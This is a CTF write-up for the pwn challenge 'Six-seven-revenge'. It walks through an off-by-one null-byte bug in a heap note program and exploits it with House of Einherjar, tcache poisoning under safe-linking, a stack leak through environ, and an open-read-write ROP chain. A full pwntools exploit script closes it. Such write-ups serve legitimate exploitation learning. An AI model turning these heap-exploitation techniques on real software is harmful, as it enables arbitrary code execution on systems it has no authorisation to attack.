---
layout: post
title: "0xFunCTF2026 Writeup :: Six-seven-revenge"
date: 2026-02-22
categories: [Writeups, pwn, Heap challenges]
tags:
  [
    writeup,
    heap,
    tcache,
    pwn,
    rop,
    glibc2.42,
    house_of_einherjar,
    off-by-one,
    unsafe-unlink,
  ]
---

- Challenge: Six-seven-revenge
- Category: pwn

## Introduction

In <a href="https://ghostinthefingers.github.io/posts/six-seven-lmao/"><strong>Six-seven-lmao</strong></a> the bug was a straightforward use-after-free because delete did not clear pointers. In Six-seven-revenge that path is closed. The delete function now frees and nulls both pointer and size, removing stale references and killing the UAF primitive. There is no double free, no classic overflow, and no direct heap corruption. The vulnerability is a single-byte Off-By-One inside edit_note.

## Vulnerable Code

The bug is here:

```c
unsigned __int64 edit_note()
{
  signed int v1;
  int v2;
  unsigned __int64 v3;

  v3 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ((unsigned int)v1 < 0x10 && notes[v1])
  {
    printf("Data: ");
    v2 = read(0, notes[v1], sizes[v1]);
    if (v2 >= 0)
      *((_BYTE *)notes[v1] + v2) = 0;  # <== off-by-one BUG is here
    puts("Updated!");
  }
  return v3 - __readfsqword(0x28u);
}
```

If `read()` returns exactly `sizes[v1]`, the null byte is written one byte past the chunk boundary. That byte lands in the next chunk’s size field. The least significant byte of size contains the PREV_INUSE bit. Clearing it makes glibc believe the previous chunk is free. This is the foundation of House of Einherjar.

---

## Stage 1 — Heap & Libc Leak

We start by leaking heap and libc from a large allocation.

```python
malloc(2, 1280, 'A')
read(2)

leak = p.recv()
heap_leak = u64(leak[22:30].ljust(8,b'\x00'))
heap_base = heap_leak - 0x22b0

libc_leak = u64(leak[358:366].ljust(8,b'\x00'))
libc.address = libc_leak - 0x1e7b20
```

The large chunk leaks an unsorted bin pointer to main_arena and a heap pointer. From these we compute heap base and libc base. ASLR is neutralized.

---

## Stage 2 — Preparing House of Einherjar

We allocate three adjacent chunks of size 0xf8.

```python
malloc(4, 0xf8, b'AAAA')
malloc(5, 0xf8, b'BBBB')
malloc(6, 0xf8, b'CCCC')
```

Chunk 5 will corrupt chunk 6. We craft payload to fully fill chunk 5 so that the trailing null byte overwrites chunk6->size.

```python
payload  = p64(heap_base + 0x2de0)
payload += p64(heap_base + 0x2de0)
payload += b'a' * (0xf0 - 16)
payload += p64(0x100)
edit(5, payload)
```

Because read writes exactly sizes[5] bytes, the implicit null byte clears the lowest byte of chunk6->size. PREV_INUSE becomes zero. Metadata is now forged.

---

## Stage 3 — Backward Consolidation

We free chunk 6.

```python
free(6)
```

glibc sees PREV_INUSE == 0 and performs backward consolidation using our fake metadata. This merges regions incorrectly and creates overlapping chunks. No UAF was required. Allocator logic did the work.

---

## Stage 4 — Building Overlap and Tcache Poisoning

We manipulate allocations to get a controllable freed chunk into tcache and overwrite its fd pointer through the overlapping region.

```python
mang = (heap_base+0x27d0 >> 12) ^ (libc.sym.environ-24)
edit(5, p64(mang))
```

Safe-linking requires encoding `(chunk_addr >> 12) ^ target`. The target is `environ - 24`. After poisoning, we allocate:

```python
malloc(11, 0x1f8, 'D')
malloc(10, 0x1f8, 'E')
```

The second allocation returns a chunk overlapping `environ`.

---

## Stage 5 — Stack Leak

We read from the overlapped chunk.

```python
read(10)
leak = p.recv()
stack_leak = u64(leak[30:38].ljust(8,b'\x00'))
rsp = stack_leak - 336
```

`environ` holds a stack pointer. Subtracting the known offset gives the saved return address location.

---

## Stage 6 — Overwriting RIP

We poison again, this time targeting the saved RIP.

```python
mang = (heap_base+0x27d0 >> 12) ^ (rsp-8)
edit(5, p64(mang))
malloc(11, 0x1f8, 'F')
```

The next allocation overlaps saved RIP. We write the ROP chain there.

---

## Stage 7 — ORW ROP (Seccomp Bypass)

Since system is blocked, we build ORW using raw syscalls.

```python
def rop_syscall(rax, rdi, rsi, rdx):
    rop  = p64(pop_rax) + p64(rdx)
    rop += p64(mov_rdx_rax)
    rop += p64(pop_rax) + p64(rax)
    rop += p64(pop_rdi) + p64(rdi)
    rop += p64(pop_rsi) + p64(rsi)
    rop += p64(syscall)
    return rop
```

Chain logic:

- read filename into heap
- open("flag.txt")
- read flag
- write to stdout
- exit

```python
payload  = p64(0)
payload += open_and_read_file()
malloc(14, 0x1f8, payload)
p.send(b'flag.txt\x00'.ljust(0x100,b'\x00'))
```

Execution returns into the ROP chain. The flag is printed.

---

## Full Exploit

```py
from pwn import *
import sys

fileName = './chall_patched'
e = ELF(fileName)
libc = e.libc
context.arch = 'amd64'
p = process(fileName)

# -----------------
# Helpers
# -----------------

def malloc(index, size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def free(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Index: ", str(idx))

def read_note(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("Index: ", str(idx))

def edit(index, data):
    p.sendlineafter("> ", "4")
    p.sendlineafter("Index: ", str(index))
    p.sendafter("Data: ", data)

# -----------------
# Stage 1 — Leak heap & libc
# -----------------

malloc(2, 1280, b'A'*8)
read_note(2)

leak = p.recv()
heap_leak = u64(leak[22:30].ljust(8, b'\x00'))
heap_base = heap_leak - 0x22b0

libc_leak = u64(leak[358:366].ljust(8, b'\x00'))
libc.address = libc_leak - 0x1e7b20

log.success(f"heap base  = {hex(heap_base)}")
log.success(f"libc base  = {hex(libc.address)}")

# -----------------
# Stage 2 — House of Einherjar
# -----------------

malloc(4, 0xf8, b'A')
malloc(5, 0xf8, b'B')
malloc(6, 0xf8, b'C')

payload  = p64(heap_base + 0x2de0)
payload += p64(heap_base + 0x2de0)
payload += b'a' * (0xf0 - 16)
payload += p64(0x100)

edit(5, payload)      # off-by-null clears PREV_INUSE of chunk 6
free(6)               # backward consolidation → overlap created

# -----------------
# Stage 3 — Tcache poison → environ
# -----------------

mang = (heap_base+0x27d0 >> 12) ^ (libc.sym.environ - 24)
edit(5, p64(mang))

malloc(11, 0x1f8, b'D'*8)
malloc(10, 0x1f8, b'E'*8)   # returns chunk overlapping environ

# -----------------
# Stage 4 — Leak stack
# -----------------

read_note(10)
leak = p.recv()
stack_leak = u64(leak[30:38].ljust(8, b'\x00'))
rsp = stack_leak - 336

log.success(f"stack leak = {hex(stack_leak)}")
log.success(f"saved RIP  = {hex(rsp)}")

# -----------------
# Stage 5 — Tcache poison → saved RIP
# -----------------

free(11)

mang = (heap_base+0x27d0 >> 12) ^ (rsp - 8)
edit(5, p64(mang))

malloc(11, 0x1f8, b'F'*8)

# -----------------
# Stage 6 — ORW ROP
# -----------------

pop_rax = libc.address + 0x00000000000d4f97
pop_rdi = libc.address + 0x0000000000102dea
pop_rsi = libc.address + 0x0000000000053847
mov_rdx_rax = libc.address + 0x00000000001284c7
syscall = libc.address + 0x0000000000093a56

SYS_READ  = 0
SYS_WRITE = 1
SYS_OPEN  = 2
SYS_EXIT  = 60

def rop_syscall(rax, rdi, rsi, rdx):
    rop  = p64(pop_rax) + p64(rdx)
    rop += p64(mov_rdx_rax)
    rop += p64(pop_rax) + p64(rax)
    rop += p64(pop_rdi) + p64(rdi)
    rop += p64(pop_rsi) + p64(rsi)
    rop += p64(syscall)
    return rop

DATA_ADDR = heap_base + 0x4500

def build_orw():
    rop  = b''
    rop += rop_syscall(SYS_READ, 0, DATA_ADDR, 0x100)
    rop += rop_syscall(SYS_OPEN, DATA_ADDR, 0, 0)
    rop += rop_syscall(SYS_READ, 3, DATA_ADDR, 0x100)
    rop += rop_syscall(SYS_WRITE, 1, DATA_ADDR, 0x400)
    rop += rop_syscall(SYS_EXIT, 0, 0, 0)
    return rop

payload  = p64(0)
payload += build_orw()

malloc(14, 0x1f8, payload)

# send filename
p.send(b'flag.txt\x00'.ljust(0x100, b'\x00'))

p.interactive()
```

## Conclusion 🏆

This challenge removes UAF completely. Exploitation relies on a single null byte that clears PREV_INUSE. That bit flips allocator behavior. Backward consolidation creates overlapping chunks. Overlap enables tcache poisoning. Poisoning yields stack control. Stack control gives ORW execution. No classic overflow. No double free. Just one precise byte and deep understanding of glibc internals.
